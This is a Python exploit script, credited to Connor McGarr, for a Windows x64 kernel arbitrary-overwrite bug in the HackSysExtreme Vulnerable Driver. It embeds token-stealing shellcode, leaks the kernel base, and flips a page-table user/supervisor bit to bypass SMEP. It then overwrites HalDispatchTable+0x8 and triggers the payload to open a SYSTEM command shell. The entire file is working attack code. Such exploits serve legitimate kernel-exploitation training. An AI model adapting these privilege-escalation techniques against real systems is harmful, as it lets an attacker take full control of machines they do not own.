# HackSysExtreme Vulnerable Driver Kernel Exploit (x64 Arbitrary Overwrite/SMEP Enabled)
# Author: Connor McGarr

import struct
import sys
import os
from ctypes import *

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi

# Fist structure, for obtaining nt!MiGetPteAddress+0x13 value
class WriteWhatWhere_PTE_Base(Structure):
    _fields_ = [
        ("What_PTE_Base", c_void_p),
        ("Where_PTE_Base", c_void_p)
    ]

# Second structure, for obtaining the control bits for the PTE
class WriteWhatWhere_PTE_Control_Bits(Structure):
    _fields_ = [
        ("What_PTE_Control_Bits", c_void_p),
        ("Where_PTE_Control_Bits", c_void_p)
    ]

# Third structure, to overwrite the U (user) PTE control bit to an S (supervisor/kernel) bit
class WriteWhatWhere_PTE_Overwrite(Structure):
    _fields_ = [
        ("What_PTE_Overwrite", c_void_p),
        ("Where_PTE_Overwrite", c_void_p)
    ]

# Fourth structure, to overwrite HalDispatchTable + 0x8 with kernel mode shellcode page
class WriteWhatWhere(Structure):
    _fields_ = [
        ("What", c_void_p),
        ("Where", c_void_p)
    ]

# Token stealing payload
payload = bytearray(
    "\x65\x48\x8B\x04\x25\x88\x01\x00\x00"              # mov rax,[gs:0x188]  ; Current thread (KTHREAD)
    "\x48\x8B\x80\xB8\x00\x00\x00"                      # mov rax,[rax+0xb8]  ; Current process (EPROCESS)
    "\x48\x89\xC3"                                      # mov rbx,rax         ; Copy current process to rbx
    "\x48\x8B\x9B\xE8\x02\x00\x00"                      # mov rbx,[rbx+0x2e8] ; ActiveProcessLinks
    "\x48\x81\xEB\xE8\x02\x00\x00"                      # sub rbx,0x2e8       ; Go back to current process
    "\x48\x8B\x8B\xE0\x02\x00\x00"                      # mov rcx,[rbx+0x2e0] ; UniqueProcessId (PID)
    "\x48\x83\xF9\x04"                                  # cmp rcx,byte +0x4   ; Compare PID to SYSTEM PID
    "\x75\xE5"                                          # jnz 0x13            ; Loop until SYSTEM PID is found
    "\x48\x8B\x8B\x58\x03\x00\x00"                      # mov rcx,[rbx+0x358] ; SYSTEM token is @ offset _EPROCESS + 0x358
    "\x80\xE1\xF0"                                      # and cl, 0xf0        ; Clear out _EX_FAST_REF RefCnt
    "\x48\x89\x88\x48\x03\x00\x00"                      # mov [rax+0x348],rcx ; Copy SYSTEM token to current process
    "\x48\x31\xC0"                                      # xor rax,rax         ; set NTSTATUS SUCCESS
    "\xC3"                                              # ret                 ; Done!
)

# Defeating DEP with VirtualAlloc. Creating RWX memory, and copying the shellcode in that region.
print "[+] Allocating RWX region for shellcode"
ptr = kernel32.VirtualAlloc(
    c_int(0),                         # lpAddress
    c_int(len(payload)),              # dwSize
    c_int(0x3000),                    # flAllocationType
    c_int(0x40)                       # flProtect
)

# Creates a ctype variant of the payload (from_buffer)
c_type_buffer = (c_char * len(payload)).from_buffer(payload)

print "[+] Copying shellcode to newly allocated RWX region"
kernel32.RtlMoveMemory(
    c_int(ptr),                       # Destination (pointer)
    c_type_buffer,                    # Source (pointer)
    c_int(len(payload))               # Length
)

# Print update statement for shellcode location
print "[+] Shellcode is located at {0}".format(hex(ptr))

# Creating a pointer for the shellcode (write-what-where writes a pointer to a pointer)
# Using addressof(shellcode_pointer) in Write-what-where structure #5
shellcode_pointer = c_void_p(ptr)

# c_ulonglong because of x64 size (unsigned __int64)
base = (c_ulonglong * 1024)()

print "[+] Calling EnumDeviceDrivers()..."
get_drivers = psapi.EnumDeviceDrivers(
    byref(base),                      # lpImageBase (array that receives list of addresses)
    sizeof(base),                     # cb (size of lpImageBase array, in bytes)
    byref(c_long())                   # lpcbNeeded (bytes returned in the array)
)

# Error handling if function fails
if not base:
    print "[+] EnumDeviceDrivers() function call failed!"
    sys.exit(-1)

# The first entry in the array with device drivers is ntoskrnl base address
kernel_address = base[0]

# Print update for ntoskrnl.exe base address
print "[+] Found kernel leak!"
print "[+] ntoskrnl.exe base address: {0}".format(hex(kernel_address))

# Phase 1: Grab the base of the PTEs via nt!MiGetPteAddress

# Retrieving nt!MiGetPteAddress
nt_mi_get_pte_address = kernel_address + 0xb8760

# Print update for nt!MiGetPteAddress address
print "[+] nt!MiGetPteAddress is located at: {0}".format(hex(nt_mi_get_pte_address))

# Base of PTEs is located at nt!MiGetPteAddress + 0x13
pte_base = nt_mi_get_pte_address + 0x13

# Print update for nt!MiGetPteAddress+0x13 address
print "[+] nt!MiGetPteAddress+0x13 is located at: {0}".format(hex(pte_base))

# Creating a pointer in which the contents of nt!MiGetPteAddress+0x13 will be stored in to
# Base of the PTEs are stored here
base_of_ptes_pointer = c_void_p()

# Write-what-where structure #1
www_pte_base = WriteWhatWhere_PTE_Base()
www_pte_base.What_PTE_Base = pte_base
www_pte_base.Where_PTE_Base = addressof(base_of_ptes_pointer)
www_pte_pointer = pointer(www_pte_base)

# Getting handle to driver to return to DeviceIoControl() function
handle = kernel32.CreateFileA(
    "\\\\.\\HackSysExtremeVulnerableDriver", # lpFileName
    0xC0000000,                         # dwDesiredAccess
    0,                                  # dwShareMode
    None,                               # lpSecurityAttributes
    0x3,                                # dwCreationDisposition
    0,                                  # dwFlagsAndAttributes
    None                                # hTemplateFile
)

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_pte_pointer,                       # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# CTypes way of extracting value from a C void pointer
base_of_ptes = struct.unpack('<Q', base_of_ptes_pointer)[0]

# Print update for PTE base
print "[+] Leaked base of PTEs!"
print "[+] Base of PTEs are located at: {0}".format(hex(base_of_ptes))

# Phase 2: Calculate the shellcode's PTE address

# Calculating the PTE for shellcode memory page
shellcode_pte = ptr >> 9
shellcode_pte &= 0x7ffffffff8
shellcode_pte += base_of_ptes

# Print update for Shellcode PTE
print "[+] PTE for the shellcode memory page is located at {0}".format(hex(shellcode_pte))

# Phase 3: Extract shellcode's PTE control bits

# Declaring C void pointer to store shellcode PTE control bits
shellcode_pte_bits_pointer = c_void_p()

# Write-what-where structure #2
www_pte_bits = WriteWhatWhere_PTE_Control_Bits()
www_pte_bits.What_PTE_Control_Bits = shellcode_pte
www_pte_bits.Where_PTE_Control_Bits = addressof(shellcode_pte_bits_pointer)
www_pte_bits_pointer = pointer(www_pte_bits)

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_pte_bits_pointer,               # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# CTypes way of extracting value from a C void pointer
shellcode_pte_control_bits_usermode = struct.unpack('<Q', shellcode_pte_bits_pointer)[0]

# Print update for PTE control bits
print "[+] PTE control bits for shellcode memory page: {:016x}".format(shellcode_pte_control_bits_usermode)

# Phase 4: Overwrite current PTE U/S bit for shellcode page with an S (supervisor/kernel)

# Currently, the PTE control bit for U/S of the shellcode is that of a user mode memory page
# Flipping the U (user) bit to an S (supervisor/kernel) bit
shellcode_pte_control_bits_kernelmode = shellcode_pte_control_bits_usermode - 4

# Need to store the PTE control bits as a pointer
# Using addressof(pte_overwrite_pointer) in Write-what-where structure #4 since a pointer to the PTE control bits are needed
pte_overwrite_pointer = c_void_p(shellcode_pte_control_bits_kernelmode)

# Write-what-where structure #4
www_pte_overwrite = WriteWhatWhere_PTE_Overwrite()
www_pte_overwrite.What_PTE_Overwrite = addressof(pte_overwrite_pointer)
www_pte_overwrite.Where_PTE_Overwrite = shellcode_pte
www_pte_overwrite_pointer = pointer(www_pte_overwrite)

# Print update for PTE overwrite
print "[+] Goodbye SMEP..."
print "[+] Overwriting shellcodes PTE user control bit with a supervisor control bit..."

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_pte_overwrite_pointer,          # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Print update for PTE overwrite round 2
print "[+] User mode shellcode page is now a kernel mode page!"

# Phase 5: Shellcode

# nt!HalDispatchTable address
haldispatchtable_base_address = kernel_address + 0x33c6e0

# nt!HalDispatchTable + 0x8 address
haldispatchtable = haldispatchtable_base_address + 0x8

# Print update for nt!HalDispatchTable + 0x8
print "[+] nt!HalDispatchTable + 0x8 is located at: {0}".format(hex(haldispatchtable))

# Write-what-where structure #5
www = WriteWhatWhere()
www.What = addressof(shellcode_pointer)
www.Where = haldispatchtable
www_pointer = pointer(www)

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
print "[+] Interacting with the driver..."
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_pointer,                        # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Actually calling NtQueryIntervalProfile function, which will call HalDispatchTable + 0x8, where the shellcode will be waiting.
ntdll.NtQueryIntervalProfile(
    0x1234,
    byref(c_ulonglong())
)

# Print update for shell
print "[+] Enjoy the NT AUTHORITY\SYSTEM shell!"
os.system("cmd.exe /K cd C:\\")
